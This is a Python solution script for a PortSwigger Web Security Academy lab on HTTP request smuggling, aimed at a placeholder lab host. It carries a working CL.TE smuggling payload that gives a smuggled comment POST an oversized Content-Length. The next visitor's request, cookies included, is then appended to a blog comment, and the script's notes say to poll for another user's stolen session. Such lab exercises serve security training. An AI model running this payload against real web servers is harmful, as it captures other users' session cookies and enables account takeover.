"""
Lab 9: Exploiting HTTP request smuggling to capture other users' requests
https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests
Difficulty: Practitioner

📝 Smuggle a POST to the comment-submission endpoint with an oversized
declared Content-Length, so the NEXT real user's request on this shared
back-end connection gets appended as the "comment" body — then just wait
and poll the blog for a comment containing someone else's cookie/headers.
"""

from utils import send_same_connection, normalize_crlf, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
COMMENT_PATH = "/post/comment"  # confirm exact path/params from the real form
POST_ID = "1"

SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 213
Transfer-Encoding: chunked

0

POST {comment_path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

csrf=CSRF_TOKEN&postId={post_id}&name=x&email=x%40x.com&website=http%3A%2F%2Fx.com&comment=""".format(
    host=HOST, comment_path=COMMENT_PATH, post_id=POST_ID))


def run():
    note("CSRF_TOKEN above needs a freshly fetched token — comment submission")
    note("is usually CSRF-protected, so grab one from a normal GET first.")
    note("Content-Length: 400 on the inner request is deliberately oversized —")
    note("whatever the next victim's browser sends on this connection becomes")
    note("the rest of the 'comment' field.")

    results = send_same_connection(HOST, [SMUGGLE_PAYLOAD])
    log(f"Smuggle request sent, response: {results[0][0][:200]!r}")

    note("Now repeatedly re-send this (or wait) and check the blog post's")
    note("comments for one containing another visitor's Cookie/session —")
    note("that confirms their request got captured as our comment body.")


if __name__ == "__main__":
    run()
